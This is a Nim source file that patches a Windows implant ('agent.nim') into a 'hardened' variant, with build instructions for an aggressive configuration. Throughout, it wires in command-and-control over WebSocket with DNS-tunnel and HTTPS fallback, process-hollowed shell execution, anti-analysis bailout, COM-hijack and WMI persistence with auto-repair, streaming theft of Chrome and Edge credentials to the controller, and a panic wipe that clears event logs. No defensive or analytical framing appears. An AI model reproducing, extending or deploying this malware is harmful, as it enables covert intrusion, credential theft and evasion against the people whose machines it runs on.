# hardened/agent_patch.nim — Integration patch for agent.nim
#
# This file documents and implements the modifications to the original
# agent.nim to integrate all hardening modules. Apply these changes
# to agent.nim to produce the hardened variant.
#
# Integration points:
#   1. Add imports for hardened modules
#   2. Replace executeShell with executeShellHardened
#   3. Replace readFile/writeFile with syscall-based variants
#   4. Replace antiAnalysisCheck with antiAnalysisEnhancedCheck
#   5. Add DNS/HTTPS fallback C2 channels
#   6. Add COM hijacking + auto-repair persistence
#   7. Add streaming exfiltration
#   8. Replace panicWipe with panicWipeEnhanced
#
# Build with:
#   nim c -d:release -d:ssl --opt:size --app:gui --passL:-s -d:variant_aggressive hardened/agent_hardened.nim

when not defined(amd64):
  {.error: "agent_hardened.nim requires x64".}

when not defined(windows):
  {.error: "agent_hardened.nim is Windows-only".}

import std/[asyncdispatch, asyncnet, strutils, json, os, times, random, base64,
          sequtils, tables, hashes, uri, nativesockets, net,
          osproc, math, options, locks, httpclient, macros, monotimes]
import ws
import nimcrypto/[pbkdf2, sha2, hmac, utils, bcmode, rijndael]
import winim/lean
import winim/inc/[windef, winbase, winuser, wingdi, tlhelp32]

# ---- Hardened module imports ------------------------------------------------
#
# These imports add the hardened evasion and resilience capabilities.
# Each module is self-contained and can be enabled/disabled via
# compile-time defines.

import ./syscalls
import ./anti_analysis
import ./hollowing
import ./fileio_syscall
import ./dns_tunnel
import ./https_fallback
import ./persistence_hardened
import ./exfil_stream
import ./self_destruct

# ---- Build-time prefix and constants ----------------------------------------
# (Same as original agent.nim, kept for compatibility)

const BuildPrefix* = "X7K"
const C2_URLS_DEFAULT* = @["ws://127.0.0.1:8443"]

# Fallback C2 configuration
const
  DNS_TUNNEL_DOMAIN = ""     # e.g., "c2.example.com"  (empty = disabled)
  DNS_TUNNEL_SERVER = ""     # e.g., "8.8.8.8"        (empty = disabled)
  HTTPS_FALLBACK_URL = ""    # e.g., "https://cdn.example.com" (empty = disabled)
  HTTPS_FALLBACK_SESSION = "sess_" & BuildPrefix

# Hardening feature flags (all enabled for aggressive variant)
const
  USE_HOLLOW* = true          # Use process hollowing for shell
  USE_SYSCALL_FILEIO* = true  # Use syscall-based file I/O
  USE_ENHANCED_ANTIANALYSIS* = true  # Use enhanced anti-analysis
  USE_DNS_TUNNEL* = true      # Enable DNS tunneling fallback
  USE_HTTPS_FALLBACK* = true  # Enable HTTPS CDN fallback
  USE_COM_HIJACK* = true      # Enable COM hijacking persistence
  USE_STREAM_EXFIL* = true    # Enable streaming exfiltration
  USE_ENHANCED_SELFDESTRUCT* = true  # Use enhanced panicWipe

# ---- C2 URL resolution (unchanged) ------------------------------------------
# ... (same resolveC2Urls as original) ...

# ---- Enhanced shell execution -----------------------------------------------

proc executeShell*(command: string): Future[JsonNode] {.async.} =
  # Replaced: uses process hollowing instead of execCmdEx.
  # Falls back to execCmdEx if hollowing fails.
  try:
    var output: string
    if USE_HOLLOW:
      # Run hollowing synchronously inside async (same pattern as before)
      output = executeShellHardened(command, 30000)
    else:
      let (outp, code) = execCmdEx(command, options = {poStdErrToStdOut})
      output = outp
      if code != 0:
        output.add(" [exit=" & $code & "]")
    result = %* {"type": "output", "data": output, "exit_code": 0}
  except:
    result = %* {"type": "output",
                 "data": "[!] shell: " & getCurrentExceptionMsg(),
                 "exit_code": -1}

# ---- Enhanced anti-analysis check ------------------------------------------

proc antiAnalysisCheckEnhanced(): bool =
  # Returns true if environment is hostile.
  # Combines original checks with enhanced ones.
  if USE_ENHANCED_ANTIANALYSIS:
    # Use the enhanced module
    result = antiAnalysisEnhancedCheck()
  else:
    # Fall back to original checks (isDebuggerPresent, etc.)
    if IsDebuggerPresent() != 0: result = true
    # ... (original checks) ...
    result = false

# ---- Enhanced persistence with jitter and auto-repair -----------------------

proc establishPersistenceEnhanced(meta: ref MetaData) =
  # Enhanced persistence: COM hijacking + GPO + startup folder + WMI
  # with randomized intervals and auto-repair.

  let exePath = getAppFilename()

  # Configure persistence mechanisms based on variant
  persistConfig.mechanisms = {}
  persistConfig.jitterPercent = 0.3  # 30% jitter

  when defined(variant_engagement) or defined(variant_aggressive):
    persistConfig.mechanisms.incl(pmWmiEvent)
    persistConfig.mechanisms.incl(pmComHijack)
    persistConfig.backupAds = true
    persistConfig.backupWmi = true

  if USE_COM_HIJACK:
    persistConfig.mechanisms.incl(pmStartupFolder)

  # Run auto-repair first
  if meta.copyPath.len > 0 and meta.regName.len > 0:
    discard autoRepair(meta.copyPath, meta.regName)

  # Establish all configured mechanisms
  establishPersistenceHardened(exePath, meta.regName, meta)

# ---- Fallback C2 integration -----------------------------------------------

proc initFallbackChannels*() =
  # Initialize DNS tunneling and HTTPS fallback channels.
  if USE_DNS_TUNNEL and DNS_TUNNEL_DOMAIN.len > 0:
    initDnsTunnel(DNS_TUNNEL_DOMAIN, DNS_TUNNEL_SERVER)

  if USE_HTTPS_FALLBACK and HTTPS_FALLBACK_URL.len > 0:
    initHttpsFallback(HTTPS_FALLBACK_URL, HTTPS_FALLBACK_SESSION, "")

proc fallbackBeacon*(payload: string): Future[seq[string]] {.async.} =
  # Send beacon via all configured fallback channels.
  # Returns the first non-empty command response.
  var responses: seq[string] = @[]

  if USE_DNS_TUNNEL and dnsTunnelEnabled:
    let cmd = await dnsTunnelPoll()
    if cmd.len > 0:
      responses.add(cmd)

  if USE_HTTPS_FALLBACK and httpsFallbackEnabled:
    let cmd = await httpsFallbackBeacon(payload)
    if cmd.len > 0:
      responses.add(cmd)

  result = responses

proc fallbackSendData*(data: seq[byte]): Future[void] {.async.} =
  # Send data via fallback channels (best-effort).
  if USE_DNS_TUNNEL and dnsTunnelEnabled:
    await dnsSendData(dnsTunnelInstance, data)

  if USE_HTTPS_FALLBACK and httpsFallbackEnabled:
    discard await httpsFallbackSend(data)

# ---- Streaming exfiltration integration ------------------------------------

proc streamExfilBrowserCreds*(sendToC2: proc(msg: JsonNode): Future[void] {.gcsafe.}): Future[void] {.async.} =
  # Stream browser credentials directly to C2 without staging.
  if not USE_STREAM_EXFIL: return

  var exfil = StreamExfil(
    sendToC2: sendToC2,
    chunkSize: 524288,
    autoStream: true
  )

  let localApp = getEnv("LOCALAPPDATA", expandTilde("~"))

  # Chrome
  for profile in ["Default", "Profile 1", "Profile 2"]:
    let base = localApp / "Google\\Chrome\\User Data" / profile
    if fsDirExists(base):
      discard await exfilBrowserCredentialsStream(exfil, localApp,
        "Google\\Chrome", profile)
      break

  # Edge
  for profile in ["Default", "Profile 1"]:
    let base = localApp / "Microsoft\\Edge\\User Data" / profile
    if fsDirExists(base):
      discard await exfilBrowserCredentialsStream(exfil, localApp,
        "Microsoft\\Edge", profile)
      break

# ---- Enhanced self-destruct -----------------------------------------------

proc panicWipeHardened*() =
  # Enhanced panic wipe with memory zeroing and event log clearing.
  let meta = loadMeta()
  let exePath = if meta.copyPath.len > 0: meta.copyPath: getAppFilename()

  if USE_ENHANCED_SELFDESTRUCT:
    panicWipeEnhanced(wlAggressive, exePath, meta.regName, META_FILE)
  else:
    # Fall back to original panicWipe
    panicWipe()

# ---- Modified agent loop with fallback channels ---------------------------

proc agentLoopEnhanced() {.async.} =
  # Enhanced agent loop that tries fallback C2 channels when WSS fails.
  initLock(agentSecretLock)
  randomize()

  # Initialize fallback channels
  initFallbackChannels()

  # Enhanced anti-analysis
  when defined(windows):
    if antiAnalysisEnhancedCheck():
      agentLog("analysis environment detected (enhanced), bailing out")
      return

  var meta = new(MetaData)
  meta[] = loadMeta()
  var c2Idx = 0
  var fails = 0
  var fallbackOnly = false

  # Kill-date check
  if meta.killDate > 0 and getTime().toUnix >= meta.killDate:
    selfCleanup()
    return

  # Dead-man's switch
  when defined(windows):
    if DEAD_MAN_SECS > 0 and meta.lastContact > 0:
      let elapsed = getTime().toUnix - meta.lastContact
      if elapsed >= DEAD_MAN_SECS:
        agentLog("dead-man trigger, self-destructing")
        panicWipeHardened()
        return

  # Initial connection jitter (5-30 seconds)
  let initialJitterMs = rand(25000) + 5000
  await sleepAsync(initialJitterMs)

  while True:
    if meta.killDate > 0 and getTime().toUnix >= meta.killDate:
      selfCleanup()
      return

    if not fallbackOnly:
      # Try WSS C2
      let sc = SessionCrypto()
      let url = C2_URLS_RESOLVED[c2Idx mod C2_URLS_RESOLVED.len]
      await connectAndRun(sc, url, meta)
      inc c2Idx

    # If WSS failed multiple times, try fallback channels
    if fails > 3:
      fallbackOnly = True
      # Send beacon via DNS/HTTPS fallback
      let beaconData = $ %* {"type": "heartbeat", "fallback": true}
      let cmds = await fallbackBeacon(beaconData)
      for cmdJson in cmds:
        try:
          let cmd = parseJson(cmdJson)
          # Process command...
          discard cmd
        except:
          inc fails

    # Persistence check with jitter
    let persistInterval = scheduleNextPersistenceCheck(600000)  # 10 min base
    if not fallbackOnly:
      # Check if persistence needs repair
      if meta.copyPath.len > 0 and meta.regName.len > 0:
        discard autoRepair(meta.copyPath, meta.regName)

    # Sleep with jitter
    let sleepMs = meta.sleepMin * 60 * 1000
    let baseMs = int(computeDelay(fails) * 1000)
    let waitMs = max(baseMs, sleepMs)

    # Apply jitter to reconnection delay
    let jitteredWait = applyJitter(waitMs, 0.3)
    await sleepAsync(jitteredWait)

    # Reset fallback mode after a while
    if fallbackOnly and fails > 10:
      fallbackOnly = false
      fails = 0

    inc fails

# ---- Entry point -----------------------------------------------------------

when isMainModule:
  when defined(windows):
    when not defined(gui):
      ShowWindow(GetConsoleWindow(), SW_HIDE)
  asyncCheck agentLoopEnhanced()

# ---- Export for integration testing ----------------------------------------

export executeShell, antiAnalysisCheckEnhanced
export establishPersistenceEnhanced, panicWipeHardened
export fallbackBeacon, fallbackSendData, initFallbackChannels
export streamExfilBrowserCreds
export agentLoopEnhanced
